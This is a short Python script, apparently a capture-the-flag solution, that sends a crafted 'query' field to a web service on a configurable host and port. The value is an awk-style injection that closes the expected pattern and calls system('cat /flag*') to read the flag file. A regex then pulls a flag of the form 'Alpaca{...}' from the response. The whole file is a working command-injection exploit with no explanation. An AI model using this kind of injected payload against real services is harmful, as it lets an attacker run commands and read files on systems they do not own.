import os
import requests
import re

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 3000))

payload = '.*/ { system("cat /flag*"); exit(0) } #'
response = requests.post(f"http://{HOST}:{PORT}/", data={
    "query": payload
})
print(re.findall(r"Alpaca{.+}", response.text)[0])

